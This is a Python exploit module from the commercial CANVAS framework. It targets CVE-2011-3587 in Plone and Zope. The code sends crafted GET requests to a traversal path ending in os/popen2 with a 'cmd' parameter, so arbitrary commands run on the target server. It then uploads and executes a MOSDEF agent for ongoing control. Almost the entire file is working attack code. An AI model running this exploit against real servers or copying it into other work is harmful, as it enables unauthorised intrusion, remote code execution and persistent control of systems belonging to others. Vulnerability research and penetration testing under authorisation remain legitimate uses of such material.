#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

import urllib
import httplib
import canvasengine

from exploitutils import *
from tcpexploit import tcpexploit
from ExploitTypes.CommandLineExecuter import CommandExploit
from contextlib import contextmanager

NAME                           = "Plone Zope Remote Command Execution"
DESCRIPTION                    = "Remote Command Execution"
DOCUMENTATION                  = {}
DOCUMENTATION["Notes"]         = """

Vulnerable versions include:
Plone 4.0 (through 4.0.9); Plone 4.1; Plone 4.2 (a1 and a2); Zope 2.12.x and Zope 2.13.x.

"""

DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = "CVE-2011-3587"
DOCUMENTATION["CVE Url"]       = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3587"
VERSION                        = "1.0"

PROPERTY                       = {}
PROPERTY['TYPE']               = "Web Exploits"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [ ["Linux"] ]
PROPERTY['VERSION']            = [ "All" ]


TIMEOUT = 15

@contextmanager
def no_timeout_socket():
    old           = socket.socket
    socket.socket = socket._no_timeoutsocket
    try:
        yield
    finally:
        socket.socket = old

class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)
        
        self.port     = 80
        self.ssl      = 0
        self.done     = 0
        self.version  = 0
        self.name     = NAME
        self.vhost    = ''
        self.basepath = "/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2"

    def getargs(self):
        """
        Get arguments for attack
        """
        self.getarg("port")
        self.getarg("basepath")
        self.getarg("ssl")
        self.getarg("vhost")

    def neededListenerTypes(self):
        return self.cle_neededListenerTypes()

    def test(self):
        self.getargs()
        if not self.vhost: self.vhost = self.target.resolved_from
        self.getargs_cle()
        self.get_os()

        if self.target_os != None:
            self.version = 1
            self.log('Found target OS: %s' % self.target_os)
            return 1
        
        self.log('Unable to determine target os!')
        return 0

    def run(self):
        self.getargs()
        if not self.vhost: self.vhost = self.target.resolved_from
        self.getargs_cle()
        
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.vhost, self.port))

        if self.version == 0:
            if self.test() == 0:
                self.log('Testing did not find target as vulnerable')
                return 0
            
        #next we upload a MOSDEF executable and execute it
        self.upload_and_execute()

        if self.ISucceeded():
            self.log("Got a new MOSDEF up and running!")
            return 1

        self.log('Failed')
        return 0

    def run_blind_command(self, command):
        """
        Runs the blind command.
        """
        try:
            with no_timeout_socket():
                if self.ssl:
                    self.log('Connecting to https://%s:%d' % (self.vhost, self.port))
                    connection = httplib.HTTPSConnection(self.vhost, self.port, timeout=TIMEOUT)
                else:
                    self.log('Connecting to http://%s:%d' % (self.vhost, self.port))
                    connection = httplib.HTTPConnection(self.vhost, self.port, timeout=TIMEOUT)

                request = self.basepath + '?cmd=' + urllib.quote(command)
                self.log('Request: %s' % request)
                connection.request('GET', request)
                resp = connection.getresponse()
                self.log('Response status: %d' % resp.status)
                connection.close()
        except Exception, ex:
            return False

        return True
                                    


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    
